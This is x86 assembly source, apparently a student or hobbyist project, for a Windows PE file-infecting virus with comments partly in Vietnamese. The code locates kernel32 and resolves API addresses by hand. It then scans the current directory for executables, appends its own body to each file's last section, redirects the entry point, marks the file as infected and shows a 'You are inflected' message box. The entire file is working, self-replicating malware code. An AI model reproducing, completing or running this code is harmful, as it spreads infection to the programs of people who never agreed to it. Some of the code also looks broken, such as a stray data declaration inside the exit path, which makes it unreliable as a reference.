.386
.model flat, stdcall

option casemap:none 


.code

start:

incode segment

;================================================================================

indep_start:

    call Delta
    Delta:
    pop ebp
    sub ebp,offset Delta


    mov esi,[esp]
    and esi,0FFFF0000h
    call GetK32
    jmp getInfo

GetK32:
__1:

    cmp byte ptr [ebp+K32_Limit],00h
    jz WeFailed
    
    cmp word ptr [esi],"ZM"
    jz CheckPE

__2:

    sub esi,10000h
    dec byte ptr [ebp+K32_Limit]
    jmp __1
    
CheckPE:

    mov edi,[esi+3Ch]
    add edi,esi
    cmp dword ptr [edi],"EP"
    jz WeGotK32
    jmp __2

WeFailed:

    mov esi,0BFF70000h

WeGotK32:

    xchg eax,esi

    ret

getInfo:
    mov [ebp + offset Kernel32], eax
    mov edi, eax
    mov edi, [edi+3ch] 
    add edi , 78h
    add edi, [ebp+offset Kernel32]
    mov [ebp+offset RVAExport], edi
    mov edi, [edi]
    add edi, [ebp+offset Kernel32]
    mov [ebp+offset Export], edi
    mov esi, edi
    add esi, 1Ch
    LODSD
    add eax, [ebp+offset Kernel32]
    mov [ebp + offset AddressTableVA], eax
    LODSD
    add eax, [ebp+offset Kernel32]
    mov [ebp + offset NameTableVA], eax
    LODSD
    add eax, [ebp+offset Kernel32]
    mov [ebp + offset OrdinalTableVA], eax
    ;invoke wsprintf, addr buffer, addr dinhdang,eax
    ;invoke MessageBox,0, addr buffer, addr AppName,MB_OK
    xor eax,eax
    mov [ebp+ offset Counter], eax
    ;mov esi, [ebp + offset NameTableVA]
    ;push esi
    
getNeededAPI:
    
    lea     edi,[ebp+offset @@Offsetz]
    lea     esi,[ebp+offset @@Namez]
    call    GetAPIs               
    
    lea esi, [ebp+offset swUser32dll]
    push esi
    call [ebp + offset _LoadLibrary]
    
    lea esi, [ebp+  swMessageBoxA]
    push esi
    push eax
    call [ebp+ offset _GetProcAddress]
    mov [ebp + offset _MessageBoxA], eax
    
    lea esi, [ebp+  @ExitProcess]
    push esi
    push eax
    call [ebp+ offset _GetProcAddress]
    mov [ebp + offset _ExitProcess], eax

 
;======================================================================================================================================================
;======================================================================================================================================================
;======================================================================================================================================================

main: 
       
    push 0 
    lea esi, [ebp+ swHacked]
    push esi
    lea esi, [ebp+ swHacked]
    push esi
    push 0
    call [ebp + offset _MessageBoxA]

   ; Find First File
    mov eax, offset FindData
	add eax, ebp
	push eax
	mov eax, offset FilePath
	add eax, ebp
	push eax
	call [ebp+ _FindFirstFileA]
	mov [hFindFile+ebp], eax
	
        
checkFile:
    
    cmp dword ptr[FindData+ebp], 10h
	je  Find_Next			
	cmp dword ptr[FindData+ebp], 20h
	jne Find_Next				
	
	jmp inflect
    
Find_Next:
   	mov eax, offset FindData
	add eax, ebp
	push eax
	push  [ebp+hFindFile]
	call [ebp+ _FindNextFileA]
	
	cmp eax, 0 
	je exit   

    jmp checkFile
    
    
inflect: 

   ;   ; code xuat ra msgbox
 ;     push 0 
 ;     lea esi, [ebp+ swUser32dll]
 ;     push esi
 ;     lea esi, [ebp+ swUser32dll]
 ;     push esi
 ;     push 0
 ;     call [ebp + offset _MessageBoxA]
    
    ; lay handle filePathTest
    push 0
	push 20h
	push 3
	push 0
	push 1
	push 0C0000000h
	mov eax, offset offset FindData + 44
	add eax, ebp
	push eax
	call [ebp+offset _CreateFileA]
    mov [ebp+offset hFileHost], eax
    
check_PEFile:
    push 0
    push 0
    push 0
    push [ebp + hFileHost]
    call [ebp+ _SetFilePointer]
    
    push 0
    push 0
    push 2
    mov eax, offset buffdw
    add eax, ebp
    push eax
    push [ebp+ hFileHost]
    call [ebp+ _ReadFile]
    
    mov ax, [ebp+ buffdw]
    cmp ax, 5a4dh
    jne Find_Next
    
    ;check isInflected:
    push 0
    push 0
    push 40h
    push [ebp + hFileHost]
    call [ebp+ _SetFilePointer]
    
    push 0
    push 0
    push 2
    mov eax, offset buffdw
    add eax, ebp
    push eax
    push [ebp+ hFileHost]
    call [ebp+ _ReadFile]
    
    mov ax, [ebp+ buffdw]
    cmp ax, 4b4fh
    je Find_Next
    
    ;point to 3Ch lay dia chi PEOffset 
    
	push 0
	push 0
	push 3Ch
	push [hFileHost+ebp]
	call [_SetFilePointer+ebp]
    
    ;get PEOffset
    push 0
    push 0
    push 4
    mov eax, offset PEOffset
    add eax, ebp
    push eax
    push [ebp+hFileHost]
    call [ebp + _ReadFile]
    
    ;get NumOfSections
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 6h
    push eax
	push [ebp + hFileHost]
	call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 2
    mov eax, offset NumOfSections
    add eax, ebp
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ offset _ReadFile]
    
    ;get ImageBase
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 34h
    push eax
	push [ebp + hFileHost]
	call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 4
    mov eax, offset ImageBase
    add eax, ebp
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ offset _ReadFile]
    
    ;get Old EP of Host
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 28h
    push eax
	push [ebp + hFileHost]
	call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 4 
    mov eax, offset OldEP
    add eax, ebp
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ offset _ReadFile]
    
    ;mov eax, [ebp+OldEP]
   ; add eax, [ebp+ImageBase]
   ; mov [ebp+OldEP], eax
    
    ;get File Alignment
    push 0
    push 0
    mov eax, [ebp + offset PEOffset]
    add eax, 56
    push eax
    push [ebp + hFileHost]
    call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 8
    mov eax, offset SectionAlignment
    add eax, ebp
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ offset _ReadFile]
    
    ; tim offset section cuoi
    mov ecx, [ebp+ offset NumOfSections]
    dec ecx
    mov eax, [ebp+ offset PEOffset]
    add eax, 248 + 8
goto_last:
    add eax, 40
    loop goto_last ; got eax = @ last section's header +8
    
    push 0
	push 0
	push eax
	push [hFileHost+ebp]
	call [_SetFilePointer+ebp]
    
    ;get data of last section start from VirtualSize
    push 0
    push 0
    push 32
    mov eax, offset VirtualSize
    add eax, ebp
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ offset _ReadFile]
    mov eax, [ebp+RawSize]
    mov [ebp+oldRawSize], eax
    
    ; change info of last section
    mov [ebp+offset Characteristics], 0E89BFEFFh            ; done Characteristics
    mov eax, offset indep_end - offset indep_start
    mov [ebp+ offset VRSize],eax
    mov eax, [ebp+offset VRSize]
    add [ebp+offset RawSize], eax                           
    
    mov eax, [ebp + offset RawSize]
    xor edx, edx
    div [ebp+FileAlignment]                                 ; edx = phan du 
    mov eax,[ebp+offset FileAlignment]
    sub eax, edx
    add [ebp+ RawSize], eax                                 ; done RawSize = Old Size + VR Size + phan bu 
    
    mov [ebp+numOfByteToFill], eax
    
    mov eax, [ebp+ offset RawSize]
    mov [ebp + offset VirtualSize],eax                      ; done VirtualSize = RawSize
    
   
    ; write new info to last section
    push 1
    push 0
    push -32
    push [ebp+hFileHost]
    call[ ebp+ _SetFilePointer]
    
    push 0
    push 0
    push 32
    mov eax, offset VirtualSize
    add eax, ebp
    push eax
    push [ebp+offset hFileHost]
    call[ebp+offset _WriteFile]
    
    ; calculate newEP
	push 2
	push 0
	push 0
	push [hFileHost+ebp]
	call [ebp+ _SetFilePointer]                              ; eax = size Of Host
	mov [hostSize+ebp], eax
	sub eax, [ebp+ RawAddress]
	add eax, [ebp+ VirtualAddress]
	mov [ebp+NewEP], eax
    
    
    ; write virus to end of host
    push 2
    push 0
    push 0
    push [ebp+offset hFileHost]
    call [ebp+_SetFilePointer]
            
    push 0
	push 0
	push [ebp + offset VRSize]
	mov eax,offset indep_start
	add eax, ebp
	push eax
	push [offset hFileHost + ebp]
	call [ebp + offset _WriteFile]
    
    ; fill Host with 00
    mov ecx, [ebp + numOfByteToFill]    
lap_fill:
    push ecx
    push 0
    push 0
    push 1
    mov  eax, offset byteNull
    add  eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _WriteFile]
    pop ecx
    loop lap_fill
    
    ;change to NewEP
    push 0
    push 0
    mov eax, [ebp+PEOffset]
    add eax, 28h
    push eax
    push [ebp+ offset hFileHost]
    call [ebp + _SetFilePointer]
    
    push 0
    push 0
    push 4
    mov eax, offset NewEP
    add eax, ebp
    push eax
    push [offset hFileHost +ebp]
    call [ebp+offset _WriteFile]
  
    ;change SizeOfImage
    mov eax, [ebp + RawSize]
    sub eax, [ebp + oldRawSize]
    mov [ebp+SizeDiff], eax
    
    push 0
    push 0
    mov eax, [ebp+PEOffset]
    add eax, 50h
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ _SetFilePointer]
    
    push 0
    push 0
    push 4
    mov eax, offset OldSize
    add eax, ebp
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ offset _ReadFile]
    mov eax, [ebp+OldSize]
    add  eax,[ebp+ SizeDiff]
    mov [ebp+ NewSize], eax
       
    push 0
    push 0
    mov eax, [ebp+PEOffset]
    add eax, 50h
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ _SetFilePointer]
    
    push 0
    push 0
    push 4
    mov eax, offset NewSize
    add eax, ebp
    push eax
    push [ebp + offset hFileHost]
    call [ebp + offset _WriteFile]    

    
  
    
    ; check Done
    push 0
    push 0
    push 40h
    push [ebp + hFileHost]
    call [ebp+ _SetFilePointer]
    
    push 0
    push 0
    push 2
    mov eax, offset flag
    add eax, ebp
    push eax
    push [ebp+ hFileHost]
    call [ebp+ _WriteFile]
    
   

    ; modifie shellcode
    mov edi, offset shellcode
    add edi, ebp
	add edi, 1

	mov ebx, [ebp+ OldEP]
	mov dword ptr [edi], ebx
	add edi, 5
    mov ebx, [ebp+ ImageBase]
	mov dword ptr [edi], ebx
	  
    push 0
    push 0
    mov eax, 0
    add eax, [ebp+OldSize]
    add eax, 57Eh
    push eax
    push [ebp+ offset hFileHost]
    call [ebp+ _SetFilePointer]
    
    push 0
    push 0
    push 12
    mov eax, offset shellcode
    add eax, ebp
    push eax
    push [ebp+ hFileHost]
    call [ebp+ _WriteFile]
    


  jmp Find_Next

exit:   
    
   ;   ;jmp ve ctrinh host 
 ;     mov eax,11C4h
 ;     add eax, 400000h
 ;     jmp e
    ab					db 		24 dup ('x')



  
    push [ebp+hFindFile]
    call [ebp+ _CloseHandle]
    
call [ebp+offset _ExitProcess]


;======================================================================================================================================================
;======================================================================================================================================================
;======================================================================================================================================================

GetAPI         proc


        mov     edx,esi                         ; Save ptr to name
 @_1:   cmp     byte ptr [esi],0                ; Null-terminated char?
        jz      @_2                             ; Yeah, we got it.
        inc     esi                             ; Nopes, continue searching
        jmp     @_1                             ; bloooopz...
 @_2:   inc     esi                             ; heh, don't forget this ;)
        sub     esi,edx                         ; ESI = API Name size
        mov     ecx,esi                         ; ECX = ESI = size of name

        xor     eax,eax                         ; EAX = 0
        mov     word ptr [ebp+offset Counter],ax       ; Counter set to 0
        mov esi, [ebp + offset NameTableVA]

 @_3:   push    esi                             ; Save ESI for l8r restore
        lodsd                                   ; Get value ptr ESI in EAX
        add     eax,[ebp+offset Kernel32]                ; Normalize
        mov     esi,eax                         ; ESI = VA of API name
        mov     edi,edx                         ; EDI = ptr to wanted API
        push    ecx                             ; ECX = API size
        cld                                     ; Clear direction flag     
        repe    cmpsb                           ; Compare both API names
        pop     ecx                             ; Restore ECX
        jz      @_4                             ; Jump if APIs are 100% equal
        pop     esi                             ; Restore ESI
        add     esi,4                           ; And get next value of array
        inc     word ptr [ebp+offset Counter]          ; Increase counter
        jmp     @_3                             ; Loop again


 @_4:   pop     esi                             ; Avoid shit in stack
        movzx   eax,word ptr [ebp+offset Counter]      ; Get in AX the counter
        shl     eax,1                           ; EAX = AX * 2
        add     eax,dword ptr [ebp+offset OrdinalTableVA] ; Normalize
        xor     esi,esi                         ; Clear ESI
        xchg    eax,esi                         ; EAX = 0, ESI = ptr to Ord
        lodsw                                   ; Get Ordinal in AX
        shl     eax,2                           ; EAX = AX * 4
        add     eax,dword ptr [ebp+offset AddressTableVA] ; Normalize
        mov     esi,eax                         ; ESI = ptr to Address RVA
        lodsd                                   ; EAX = Address RVA
        add     eax,[ebp+offset Kernel32]                ; Normalize and all is done.
        ret



 GetAPI         endp

;----------------------------------------------------------------------------------------------------------------
;||------------                                                                            ---------------------||
;----------------------------------------------------------------------------------------------------------------
 GetAPIs        proc


 @@1:   push    esi
        push    edi
        call    GetAPI
        pop     edi
        pop     esi
        stosd



 @@2:   cmp     byte ptr [esi],0
        jz      @@3
        inc     esi
        jmp     @@2
 @@3:   cmp     byte ptr [esi+1],0BBh
        jz      @@4
        inc     esi
        jmp     @@1
 @@4:   ret
 GetAPIs        endp

    
    

;DATA for indep=================================================================================

K32_Limit            dw 5

filePathTest         db "C:/Users/nxv99/Desktop/function.exe",0
hFileHost            dd  ?

@@Namez                 label   byte
@GetProcAddress         db      "GetProcAddress",0
@LoadLibrary            db      "LoadLibraryA",0
@ExitProcess            db      "ExitProcess",0
@CloseHandle            db      "CloseHandle",0
@CreateFileA            db      "CreateFileA",0
@FindClose              db      "FindClose",0
@FindFirstFileA         db      "FindFirstFileA",0
@FindNextFileA          db      "FindNextFileA",0
@GetCurrentDirectoryA   db      "GetCurrentDirectoryA",0
@ReadFile               db      "ReadFile",0
@SetFilePointer         db      "SetFilePointer",0
@WriteFile              db      "WriteFile",0
@lstrcatA               db      "lstrcatA",0
                        db      0BBh

@@Offsetz               label   byte
_GetProcAddress         dd      00000000h
_LoadLibrary            dd      00000000h
_ExitProcess            dd      00000000h
_CloseHandle            dd      00000000h
_CreateFileA            dd      00000000h
_FindClose              dd      00000000h
_FindFirstFileA         dd      00000000h
_FindNextFileA          dd      00000000h
_GetCurrentDirectoryA   dd      00000000h
_ReadFile               dd      00000000h
_SetFilePointer         dd      00000000h
_WriteFile              dd      00000000h
_lstrcatA               dd      00000000h
_VirtualProtect         dd      00000000h


@VirtualProtect         db      "VirtualProtect",0

swHacked                db      "You are inflected",0

swUser32dll             db      "user32.dll",0
swKernel32dll           db      "Kernel32.dll",0

swMessageBoxA           db      "MessageBoxA",0
_MessageBoxA            dd      00000000h
_Kernel32dll            dd      000000000h
ddGetProcAddress        db      000000000h
byteNull                dw      0h

SectionAlignment        dd  ?
FileAlignment           dd  ?

VirtualSize					dd	?
VirtualAddress				dd	?
RawSize						dd	?	
RawAddress					dd	?		
Free						db 		12 dup(?)
Characteristics				dd	?

hostSize            dd ?
flag                db "OK",0
OldSize             dd ?
SizeDiff            dd ?
oldRawSize          dd ?
ImageBase           dd ?
OldEP               dd ?
NewEP               dd ?
numOfByteToFill     dd ?
VRSize              dd ?
PEOffset            dd ?
NumOfSections       dd ?
buff                dd ?
Counter             dd ?
Kernel32            dd ?
RVAExport           dd ?
Export              dd ?
AddressTableVA      dd ?
NameTableVA         dd ?
OrdinalTableVA      dd ?
NewSize             dd ?
buffdw              dw ?
FilePath					db 		".\*.*", 50 dup(0)
hFindFile					dd	?
FindData					db 		592 dup (?) ,0
shellcode                   db   0B8h,0C4h,11h,00h,00h,05h,00h,00h,40h,00h,0FFh,0E0h
shellcode2                   db   12 dup ('z'),0
;===============================================================================================

indep_end: 

incode ends


end start